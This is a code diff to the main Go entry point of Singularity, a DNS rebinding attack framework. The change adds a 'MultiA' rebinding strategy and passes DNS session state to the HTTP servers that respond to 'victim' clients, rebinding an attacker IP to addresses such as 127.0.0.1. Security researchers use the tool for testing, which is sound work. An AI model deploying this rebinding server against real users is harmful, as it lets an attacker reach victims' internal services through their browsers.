@@ -5,9 +5,10 @@ import (
 	"fmt"
 	"log"
 	"net/http"
-	"github.com/nccgroup/singularity"
 	"strconv"
 	"time"
+
+	"github.com/nccgroup/singularity"
 
 	"github.com/miekg/dns"
 )
@@ -33,7 +34,7 @@ func initFromCmdLine() *singularity.AppConfig {
 	var myArrayPortFlags arrayPortFlags
 
 	var dnsRebindingStrategy = flag.String("DNSRebindStrategy", "DNSRebindFromQueryFirstThenSecond",
-		"Specify how to respond to DNS queries from a victim client:  \"DNSRebindFromQueryRoundRobin\", \"DNSRebindFromQueryFirstThenSecond\", \"DNSRebindFromQueryRandom\"")
+		"Specify how to respond to DNS queries from a victim client:  \"DNSRebindFromQueryRoundRobin\", \"DNSRebindFromQueryFirstThenSecond\", \"DNSRebindFromQueryRandom\", DNSRebindFromFromQueryMultiA\"")
 	var responseIPAddr = flag.String("ResponseIPAddr", "192.168.0.1",
 		"Specify the attacker host IP address that will be rebound to the victim host address using strategy specified by flag \"-DNSRebingStrategy\"")
 	var responseReboundIPAddr = flag.String("ResponseReboundIPAddr", "127.0.0.1",
@@ -58,10 +59,13 @@ func initFromCmdLine() *singularity.AppConfig {
 			appConfig.RebindingFn = singularity.DNSRebindFromQueryFirstThenSecond
 		case "DNSRebindFromQueryRandom":
 			appConfig.RebindingFn = singularity.DNSRebindFromQueryRandom
+		case "DNSRebindFromFromQueryMultiA":
+			appConfig.RebindingFn = singularity.DNSRebindFromFromQueryMultiA
 		default:
 			log.Fatal("No valid DNS rebinding strategy provided")
 		}
 	}
+	appConfig.RebindingFnName = *dnsRebindingStrategy
 
 	if !flagset["HTTPServerPort"] {
 		myArrayPortFlags = arrayPortFlags{8080}
@@ -81,11 +85,13 @@ func initFromCmdLine() *singularity.AppConfig {
 func main() {
 
 	appConfig := initFromCmdLine()
-	dcss := &singularity.DNSClientStateStore{Sessions: make(map[string]*singularity.DNSClientState)}
-	hss := &singularity.HTTPServerStore{DynamicServers: make([]*http.Server, 2),
+	dcss := &singularity.DNSClientStateStore{Sessions: make(map[string]*singularity.DNSClientState),
+		RebindingStrategy: appConfig.RebindingFnName}
+	hss := &singularity.HTTPServerStoreHandler{DynamicServers: make([]*http.Server, 2),
 		StaticServers: make([]*http.Server, 1),
 		Errc:          make(chan singularity.HTTPServerError, 1),
-		AllowDynamicHTTPServers: appConfig.AllowDynamicHTTPServers}
+		AllowDynamicHTTPServers: appConfig.AllowDynamicHTTPServers,
+		Dcss: dcss}
 
 	// Attach DNS handler function
 	dns.HandleFunc(".", singularity.MakeRebindDNSHandler(appConfig, dcss))
@@ -106,7 +112,7 @@ func main() {
 
 	for _, port := range appConfig.HTTPServerPorts {
 		// Start HTTP Servers
-		httpServer := singularity.NewHTTPServer(port, hss)
+		httpServer := singularity.NewHTTPServer(port, hss, dcss)
 		httpServerErr := singularity.StartHTTPServer(httpServer, hss, false)
 
 		if httpServerErr != nil {
